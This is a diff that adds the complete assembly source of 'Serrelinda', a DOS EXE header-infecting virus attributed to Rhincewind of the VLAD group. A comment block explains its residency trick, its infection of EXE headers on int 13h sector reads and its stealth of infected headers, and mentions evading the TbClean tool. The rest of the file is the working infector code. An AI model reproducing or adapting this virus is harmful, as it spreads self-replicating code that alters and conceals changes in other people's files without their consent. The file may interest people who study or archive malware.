@@ -1,0 +1,180 @@
+; Serrelinda, an EXE header infector by Rhincewind [Vlad]
+;
+; This is a fullstealth header infector with a twist: it goes resident
+; underneath the hosting program, does not convert hosts to COM structure
+; and is capable of restoring the host in memory (no reexecution).
+; In short, it's the old principle all over again in a new implementation.
+;
+; Viruscode is inserted into the zerospace in suitable EXE headers, suitable
+; meaning: no relocation items and a headersize of 512 bytes. The trick is
+; to set the headersize to 32 bytes, and just zero CS:IP. This will cause
+; the viruscode to be loaded below the host's code, giving the following
+; memory order: MCB PSP VIRUS HOST. The virus switches context before copying
+; itself over the PSP. The original MCB is adjusted to reflect the virussize
+; and interpreter-ownership, and a 2nd MCB is created above the viruscode. 
+; Finally, a new PSP is created, and we have: MCB VIRUS MCB PSP HOST which
+; is in a word, great. The only drawback is the memory fragmentation
+; caused by the environment block no longer being attached to it's owning
+; PSP. (non-consecutive MCBs with same ID field).
+;
+; Header infection is done on sector reads. A suitable header is read,
+; infected, written back and then stealthed before it's returned.
+; This is Serrelinda's safeguard. If ever you infect some files by accident, 
+; just copy them and reboot. Voila, la disinfection.
+;
+; Oh FYI, TbClean bails on int 21, ah=55 or ah=26 (create PSP). 
+; More on Frans' jumptables later.
+;
+; Rhince.
+
+                .model tiny
+                .code
+                org 0
+viruslen        equ (endvirus-start)
+start:         
+                xor di,di
+                mov si,di
+                mov bx, word ptr ds:[si+16h]
+                mov ah, 50h
+                int 21h
+                mov cx, 00ffh
+                push cx
+                push word ptr ds:[si+2ch]
+                push cs
+                pop ds
+                rep movsb
+                mov virseg,es
+                jmp $+2
+                db 0eah
+                dw offset low_entry
+virseg          dw 0
+low_entry:      mov cx, viruslen-0ffh
+                rep movsb
+                mov ax,cs
+                dec ax
+                mov ds,cx
+                mov si,13h*4
+                movsw
+                movsw
+                mov si,ds
+                mov ds,ax
+                mov di, 1d0h
+                mov al, 'M'
+                xchg al, byte ptr ds:[si]
+                stosb
+                scasw
+                mov word ptr ds:[si+1],bx
+                mov ax, 01dh
+                xchg word ptr ds:[si+3],ax
+                sub ax, word ptr ds:[si+3]
+                stosw
+                mov dx,es
+                add dx,1eh
+                mov ah, 55h
+                int 21h
+                mov word ptr es:[di-4],dx
+                pop cx
+                dec cx
+                mov es,cx
+                mov word ptr es:[1],dx
+                push dx
+                mov ax, offset int13+10h
+                mov dx, 2513h
+                xchg ax,dx
+                int 21h
+installed:      pop bx
+                mov ds,bx
+                mov es,bx
+                add bx, 10h
+                add word ptr cs:[jmp_cs],bx
+                inc cx
+                mov word ptr ds:[2ch], cx
+                pop cx
+                xor ax,ax
+                mov bx,ax
+                mov si,ax
+                mov di,sp
+                jmp $+2
+                db 0eah
+jmp_ip          dw 0
+jmp_cs          dw -10h
+int13:                
+                cmp ah,2
+                jz do_it
+go_go_int13:
+                jmp go_int13
+do_it:
+                pushf
+                call dword ptr cs:int13offset+10h
+                push ax
+                pushf
+                jc go_wrong_file
+                mov ax, word ptr es:[bx]
+                xor al,ah
+                cmp al, 4dh xor 5ah
+                jz exe_file
+go_wrong_file:  jmp wrong_file_bubba
+                db '[Serrelinda], Rhince/VLAD'
+exe_file:
+                xor ax,ax
+                cmp word ptr es:[bx+6],ax
+                jnz go_wrong_file
+                cmp word ptr es:[bx+1ah],ax
+                jnz go_wrong_file
+                cmp word ptr es:[bx+20h],0FF33h
+                jz mr_stealth
+                cmp word ptr es:[bx+8],20h
+                jnz go_wrong_file
+infect:
+                add word ptr es:[bx+0eh],20h
+                mov ax, word ptr es:[bx+14h]
+                mov word ptr cs:[jmp_ip+10h],ax
+                mov ax, word ptr es:[bx+16h]
+                mov word ptr cs:[jmp_cs+10h],ax
+                mov word ptr es:[bx+8],2
+                push cx
+                push si
+                push di
+                push ds
+                push cs
+                pop ds
+                mov si, 10h
+                lea di, [bx+20h]
+                mov cx, (endvirus-start)
+                cld
+                rep movsb
+                mov word ptr es:[bx+14h], cx
+                mov word ptr es:[bx+16h], cx
+                xchg ax,cx
+                pop ds
+                pop di
+                pop si
+                pop cx
+                add ax, 0301h
+                int 13h
+mr_stealth:
+                sub word ptr es:[bx+0eh],20h
+                mov ax, word ptr es:[bx+jmp_ip+20h]
+                mov word ptr es:[bx+14h],ax
+                mov ax, word ptr es:[bx+jmp_cs+20h]
+                mov word ptr es:[bx+16h],ax
+                mov word ptr es:[bx+8],20h
+                push cx
+                push di
+                cld
+                mov cx, (endvirus-start)
+                lea di, [bx+20h]
+                xor al,al
+                rep stosb
+                pop di
+                pop cx
+wrong_file_bubba:
+                popf
+                pop ax
+                retf 2
+go_int13:
+                db 0eah
+endvirus:
+int13offset     dw 0
+int13seg        dw 0
+                end start
